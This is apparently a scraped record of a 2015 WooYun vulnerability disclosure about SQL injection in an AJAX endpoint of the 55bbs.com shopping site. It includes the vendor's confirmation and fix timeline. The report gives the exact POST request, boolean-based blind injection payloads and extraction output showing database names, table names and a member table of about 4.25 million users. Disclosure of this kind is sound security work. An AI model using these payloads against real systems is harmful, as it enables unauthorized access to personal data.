{"id": 38940, "wybug_id": "wooyun-2015-0110575", "wybug_title": "我爱购物网某站SQL注射影响四百多万用户信息", "wybug_corp": "55bbs.com", "wybug_author": "紫霞仙子", "wybug_date": "2015-04-27 09:12", "wybug_open_date": "2015-05-19 12:51", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-19：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 233 详细说明：  \n千万要记得，不能指哪补那，这个就是个活生生的例子。上次修了a=retrypwd，这次a=getemail的地方。POST /index.php?a=getemail&c=ajaxhelp HTTP/1.1Content-Length: 58Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: backfeed.55bbs.comCookie: z_pro_city=s_provice%3Dbeijingshi%26s_city%3DHost: backfeed.55bbs.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*username=e测试下面payloade' AND 2+1-1-1=1 AND '000u0YT'='000u0YT e' AND 3+1-1-1=1 AND '000u0YT'='000u0YTe' AND 3*2=5 AND '000u0YT'='000u0YT e' AND 3*2=6 AND '000u0YT'='000u0YT 判断注入存在\n   漏洞证明：  \n---Parameter: username (POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: username=e' AND 4307=4307 AND 'SSUy'='SSUy---web application technology: Nginxback-end DBMS: MySQL 5database management system users [1]:[*] '55bbs'@'10.15.18%'available databases [3]:[*] `55bbs`[*] information_schema[*] testdatabase management system users [1]:[*] '55bbs'@'10.15.18%'Database: 55bbs[1322 tables]   --------------》 怎么会这么多表。。。。+------------------------------+| 55_log_bbs_admin_2015        || 55_log_bbs_threads_2014_12   || 55_log_bbs_threads_2015_01   || 55_log_bbs_threads_2015_02   || 55_log_bbs_threads_2015_03   || 55_log_bbs_threads_2015_04   || 55_log_member_login_2013     || 55_log_member_login_2015     || cdb_access                   || cdb_activities               || cdb_activityapplies          || cdb_adminactions             || cdb_admingroups              || cdb_adminnotes               || cdb_adminsessions            || cdb_advertisements           || cdb_announcements            || cdb_applyscore               || cdb_tradecomments            || cdb_tradelog                 || cdb_tradeoptionvars          || cdb_trades                   || cdb_typemodels               || cdb_typeoptions              || cdb_typeoptionvars           || cdb_typevars                 || cdb_usergroups               || cdb_validating               || cdb_verify                   || cdb_verify_catgory           || cdb_verify_report            || cdb_videos                   || cdb_videotags                || cdb_words                    || contact_cms_bbs              || keywords_log201504           || keywords_record              || myposts_0                    || myposts_1                    |我还真的把表名全跑出来了。。。。不贴了，太长。。。。。重点在这里：Database: 55bbs+-------------+---------+| Table       | Entries |+-------------+---------+| cdb_members | 4249662 |     将近 425 万用户。+-------------+---------+\n   修复方案：  1，修复问题，2，优化下数据库吧，这样下去迟早会宕。   版权声明：转载请注明来源 紫霞仙子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-04-28 09:36 厂商回复： 漏洞确实存在，等待修复 最新状态： 2015-05-19：已经解决  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}